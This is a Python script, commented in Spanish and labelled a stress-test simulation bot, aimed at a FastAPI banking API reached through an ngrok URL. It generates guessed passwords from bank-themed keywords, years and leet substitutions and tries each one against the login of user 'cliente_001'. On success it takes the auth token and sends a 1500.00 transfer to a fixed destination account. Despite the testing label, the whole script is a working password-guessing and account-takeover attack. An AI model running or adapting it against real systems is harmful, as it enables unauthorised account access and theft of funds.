"""
Módulo de Simulación de Prueba de Estrés / Bot de Evaluación para la API
-------------------------------------------------------------------------
Descripción: Realiza pruebas de autenticación heurística y ejecuta 
             transferencias simuladas directamente contra los endpoints de FastAPI.
"""

import requests
import time

# ==========================================
# CONFIGURACIÓN DE ENDPOINTS Y RED
# ==========================================
# URL base expuesta mediante el túnel de ngrok
API_BASE = "https://statue-essential-dirtiness.ngrok-free.dev"

# Endpoints de la API REST de FastAPI
LOGIN_URL = f"{API_BASE}/api/v1/auth/login"
TRANSFER_URL = f"{API_BASE}/api/v1/transactions/transfer"

# Usuario objetivo para la prueba de acceso
TARGET_USER = "cliente_001"

# Cabeceras HTTP estándar para peticiones JSON
# 'ngrok-skip-browser-warning' omite la pantalla de advertencia intermedia de ngrok
HEADERS = {
    "Content-Type": "application/json",
    "ngrok-skip-browser-warning": "true"
}

# ==========================================
# DICCIONARIO Y PATRONES HEURÍSTICOS
# ==========================================
CONTEXT_KEYWORDS = ["Banco", "Secure"]
YEARS = ["2024", "2026"]
SYMBOLS = ["$", "#"]

def generate_passwords():
    """
    Genera combinaciones candidatas de contraseñas basándose en palabras clave,
    reemplazos leet-speak (e -> 3, s -> $) y sufijos habituales.
    
    Returns:
        list[str]: Lista de variaciones de contraseñas a evaluar.
    """
    generated = set()
    for base in CONTEXT_KEYWORDS:
        for yr in YEARS:
            for sym in SYMBOLS:
                # Sustitución leet para simular variaciones comunes
                leet = base.replace('e', '3').replace('s', '$')
                generated.add(f"{base}{yr}")
                generated.add(f"{leet}{sym}{yr}")
                generated.add(f"Banco$ecure#{yr}")
    return list(generated)

def run_api_bot():
    """
    Flujo principal de simulación del bot:
    1. Evalúa el listado de contraseñas contra el endpoint de inicio de sesión.
    2. Extrae el token de autorización y la cuenta de origen del response exitoso.
    3. Construye el payload de transacción con la estructura validada por el esquema Pydantic.
    4. Ejecuta la petición POST de transferencia y reporta la respuesta del backend.
    """
    candidates = generate_passwords()
    print(f"🤖 [BOT API] Iniciando simulación contra {API_BASE}...\n")

    for attempt, pwd in enumerate(candidates, 1):
        # Cuerpo de la petición para autenticación
        login_payload = {
            "username": TARGET_USER,
            "password": pwd
        }

        try:
            # Envío de la petición de inicio de sesión
            response = requests.post(LOGIN_URL, json=login_payload, headers=HEADERS, timeout=5)

            # HTTP 200 OK: Autenticación exitosa
            if response.status_code == 200:
                login_data = response.json()
                print(f"✅ [Intento {attempt}] ¡Acceso concedido! Contraseña: '{pwd}'")

                # Preparar cabeceras con token de autorización si la API lo requiere
                headers_tx = HEADERS.copy()
                token = login_data.get("token") or login_data.get("access_token")
                if token:
                    headers_tx["Authorization"] = f"Bearer {token}"

                # Extraer id de cuenta retornado en la respuesta o usar identificador predeterminado
                source_account = login_data.get("account_id", "MX-4821-0001")

                # Estructura requerida por el backend para procesar la transacción
                transfer_payload = {
                    "account_id": source_account,
                    "destination_account": "MX-9012-3344",
                    "amount": 1500.00
                }

                print(f"💸 Ejecutando transferencia: {transfer_payload}")
                tx_resp = requests.post(TRANSFER_URL, json=transfer_payload, headers=headers_tx, timeout=5)

                # Diagnóstico de respuesta de la transacción
                print(f"\n📊 Respuesta Transferencia: HTTP {tx_resp.status_code}")
                try:
                    print(f"🔍 Detalle devuelto por el Backend: {tx_resp.json()}")
                except Exception:
                    print(f"🔍 Detalle devuelto por el Backend: {tx_resp.text}")
                    
                return  # Finalizar la ejecución tras completar el flujo con éxito

            else:
                # HTTP 401 Unauthorized u otros códigos de rechazo
                print(f"❌ [Intento {attempt}] Rechazado (HTTP {response.status_code}) -> Probado: '{pwd}'")

        except Exception as e:
            print(f"⚠️ Error de conexión en intento {attempt}: {e}")

        # Latencia deliberada entre intentos para controlar la frecuencia de peticiones
        time.sleep(0.4)

    print("\n❌ Finalizado: Ninguna contraseña logró autenticarse.")

if __name__ == "__main__":
    run_api_bot()